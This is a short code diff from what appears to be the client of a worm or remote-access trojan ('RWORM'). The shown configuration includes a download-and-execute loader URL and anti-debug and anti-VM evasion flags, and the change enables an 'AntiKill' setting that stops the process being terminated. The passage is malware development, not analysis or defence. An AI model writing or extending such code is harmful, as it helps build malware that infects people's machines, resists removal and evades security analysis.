@@ -23,7 +23,7 @@ namespace RWORM.Client.Core
         public static string TaskLoaderUrl = "";          // URL to download+exec on connect
 
         // ── Anti-Kill & Evasion ───────────────────────────────────────────────
-        public static bool AntiKill  = false;
+        public static bool AntiKill  = true;
         public static bool AntiDebug = false;
         public static bool AntiVM    = false;
 
